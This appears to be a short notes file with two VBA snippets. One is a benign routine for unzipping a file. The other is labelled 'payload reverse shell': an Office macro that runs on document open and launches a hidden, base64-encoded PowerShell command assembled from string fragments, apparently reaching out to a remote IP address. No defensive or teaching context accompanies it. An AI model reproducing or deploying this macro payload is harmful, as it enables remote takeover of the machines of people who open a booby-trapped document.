# unzip

```vbscript
Sub UnzipAFile(zippedFileFullName As Variant, unzipToPath As Variant)

Dim ShellApp As Object

  'Copy the files & folders from the zip into a folder
  Set ShellApp = CreateObject("Shell.Application")
  ShellApp.Namespace(unzipToPath).CopyHere ShellApp.Namespace(zippedFileFullName).items

End Sub
```



# payload reverse shell

```
Sub AutoOpen()
    Shell
End Sub
Sub Document_Open()
    Shell
End Sub
Sub Shell()
		Dim Str As String
    Str = Str + "powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZ"
    Str = Str + "QByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA"
    Str = Str + "6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9A"
    Str = Str + "AMQA2ADgALgAxADEAOQAuADEAMgAyAC8AOQB6AGcATABWAHoAa"
    Str = Str + "ABUAFcAUwAxAFAAQwBNACcAKQApADsA"
    
    CreateObject("Wscript.Shell").Run Str

End Sub
```

